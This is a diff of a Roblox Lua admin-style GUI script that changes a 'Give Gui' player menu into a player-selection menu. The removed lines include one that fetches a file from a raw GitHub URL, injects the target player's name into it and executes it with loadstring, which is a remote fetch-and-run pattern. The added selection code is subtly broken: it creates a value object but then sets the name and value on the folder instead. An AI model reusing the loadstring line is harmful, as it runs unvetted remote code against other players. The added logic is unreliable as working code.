@@ -1305,7 +1305,7 @@ button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Gui To Give Gui"
+button.Text = "Select Gui"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
@@ -1330,8 +1330,13 @@ button.MouseButton1Down:connect(function()
 	button.Parent = gui
 	button.Size = UDim2.new(0, 100, 0, 30)
 	button.Position = UDim2.new(0, 8, 0, pos)
-	button.Text = "Give"
+	button.Text = "Select"
 	button.MouseButton1Click:connect(function()
+		local selectFolder = game.ServerStorage:FindFirstChild("SelectedPlayers")
+		if selectFolder == nil then
+			selectFolder = Instance.new("Folder",game.ServerStorage)
+			selectFolder.Name = "SelectedPlayers"
+		end
 		if enabled == false then 
 			enabled = true
 			local a = game.Players:GetChildren()
@@ -1350,7 +1355,10 @@ button.MouseButton1Down:connect(function()
 				bu.Text = a[i].Name
 				bu.BackgroundTransparency = 1
 				bu.TextTransparency = 1
-				bu.BackgroundColor3 = Color3.new(0,0.5,0)
+				bu.BackgroundColor3 = Color3.new(1,0,0)
+				if selectFolder:FindFirstChild(bu.Text) ~= nil then
+					bu.BackgroundColor3 = Color3.new(0,1,0)
+				end
 				coroutine.resume(coroutine.create(function()
 					for i=1, 3 do
 						wait()
@@ -1361,10 +1369,15 @@ button.MouseButton1Down:connect(function()
 				bu.MouseButton1Down:connect(function()
 					local play = game.Players:findFirstChild(bu.Text)
 					if play ~= nil then
-						loadstring(game.HttpService:GetAsync("https://raw.githubusercontent.com/gleb2803/tester/refs/heads/main/tester.py"):gsub("/localplayer/",play.Name))()
-						bu.Text = "Gived!"
-						wait(2)
-						bu.Text = a[i].Name
+						if selectFolder:FindFirstChild(bu.Text) ~= nil then
+							bu.BackgroundColor3 = Color3.new(1,0,0)
+							selectFolder:FindFirstChild(bu.Text):Remove()
+						else
+							local playerValue = Instance.new("IntValue",selectFolder)
+							selectFolder.Name = bu.Text
+							selectFolder.Value = play.UserId
+							bu.BackgroundColor3 = Color3.new(0,1,0)
+						end
 					end
 				end)
 			end
